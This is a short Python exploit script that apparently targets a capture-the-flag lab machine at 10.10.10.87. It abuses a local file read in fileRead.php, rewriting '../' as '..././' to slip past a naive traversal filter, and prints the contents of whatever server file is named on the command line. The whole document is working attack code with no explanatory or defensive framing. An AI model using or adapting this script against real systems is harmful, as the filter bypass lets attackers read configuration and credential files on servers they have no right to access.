#!/usr/bin/python
from requests import *
from json import *
from sys import argv

s = session()
host = 'http://10.10.10.87/'
dirRead = 'fileRead.php'

payload = argv[1]
print ("[*] Reading {}".format(payload))

payload = payload.replace('../', '..././')
resp = s.post(host + dirRead, data={'file':payload})
content = resp.text
print ("[+] File content:\n{}".format(loads(content)['file']))

